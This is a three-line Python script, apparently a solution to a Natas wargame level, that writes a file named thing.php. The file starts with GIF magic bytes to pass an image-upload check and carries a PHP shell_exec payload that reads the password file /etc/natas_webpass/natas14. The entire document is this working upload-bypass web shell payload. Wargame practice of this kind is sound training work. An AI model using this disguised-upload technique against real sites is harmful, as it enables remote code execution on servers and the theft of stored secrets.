f = open("thing.php", "w")
f.write("\x47\x49\x46\x38"+"<? echo shell_exec(\"cat /etc/natas_webpass/natas14\"); ?>")
f.close()
